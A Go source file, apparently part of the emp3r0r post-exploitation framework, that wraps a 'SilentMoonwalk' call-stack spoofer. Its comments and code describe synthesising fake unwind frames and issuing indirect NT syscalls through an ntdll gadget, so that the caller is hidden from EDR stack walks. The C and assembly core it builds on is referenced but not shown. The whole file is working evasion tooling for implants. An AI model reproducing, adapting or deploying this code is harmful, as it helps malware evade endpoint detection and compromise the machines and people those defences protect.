//go:build windows && amd64 && cgo

// Package smw bridges the Go syscall package to the SilentMoonwalk (SMW)
// desync call-stack spoofer. It is deliberately a separate package: a cgo
// package cannot contain Go assembly files, and the syscall package needs
// its Go-assembly syscall primitives for the plain (fallback) path.
//
// The desync core (csrc/DesyncSpoofer.asm) is assembled to desyncspoofer.syso
// at build time — run `go generate ./lib/syscall/smw`, `make -C lib/syscall/smw`,
// or the emp3r0r build (core/build.py) which assembles it automatically.
//
// The C side (csrc/SilentMoonwalk.c + csrc/DesyncSpoofer.asm) synthesizes
// fake unwind frames terminating in kernel32!BaseThreadInitThunk ->
// ntdll!RtlUserThreadStart and jumps to the ntdll "syscall; ret" gadget with
// EAX=SSN, hiding the Go return address from EDR stack walks.
package smw

//go:generate nasm -f win64 csrc/DesyncSpoofer.asm -o desyncspoofer.syso

/*
#cgo CFLAGS: -Icsrc
#cgo LDFLAGS: -lkernel32
#include <windows.h>
#include "Spoof.h"
#include "SilentMoonwalk.c"
*/
import "C"

import (
	"fmt"
	"sync"
	"unsafe"
)

// functionCall mirrors the C FUNCTION_CALL layout (csrc/Spoof.h) on amd64 so
// arguments can be marshaled without depending on cgo's typedef handling:
//
//	PVOID          ptr  -> uintptr      (0)
//	DWORD          ssn  -> uint32       (8)
//	int            argc -> int32        (12)
//	ULONG_PTR[10]  args -> [10]uintptr  (16)
type functionCall struct {
	ptr  uintptr
	ssn  uint32
	argc int32
	args [10]uintptr
}

var (
	initOnce sync.Once
	initOK   bool
)

// ready initializes the SilentMoonwalk template exactly once (the C side
// caches the static discovery: KernelBase frames, ROP gadgets, thread-root
// sizes). A false return means the spoofed path is unusable and callers
// should degrade to a plain indirect syscall.
func ready() bool {
	initOnce.Do(func() {
		initOK = C.smw_ensure_init() == 1
	})
	return initOK
}

// Ready reports whether the SilentMoonwalk spoofed path is usable in this
// build (windows/amd64 + cgo) and initialized successfully.
func Ready() bool {
	return ready()
}

// Call executes the NT syscall identified by ssn with SilentMoonwalk
// call-stack spoofing, jumping to the ntdll "syscall; ret" gadget at gadget.
// Returns an error when the SMW layer could not be initialized or when the
// argument count exceeds the desync handler's 8-argument limit.
func Call(ssn uint32, gadget uintptr, args []uintptr) (uint32, error) {
	if len(args) > 8 {
		return 0, fmt.Errorf("SilentMoonwalk supports at most 8 arguments, got %d", len(args))
	}
	if !ready() {
		return 0, fmt.Errorf("SilentMoonwalk: smw_ensure_init failed (no usable frames/gadgets)")
	}

	fc := functionCall{
		ptr:  gadget,
		ssn:  ssn,
		argc: int32(len(args)),
	}
	for i, a := range args {
		fc.args[i] = a
	}

	var call C.FUNCTION_CALL
	*(*functionCall)(unsafe.Pointer(&call)) = fc

	return uint32(C.spoof_call(&call)), nil
}
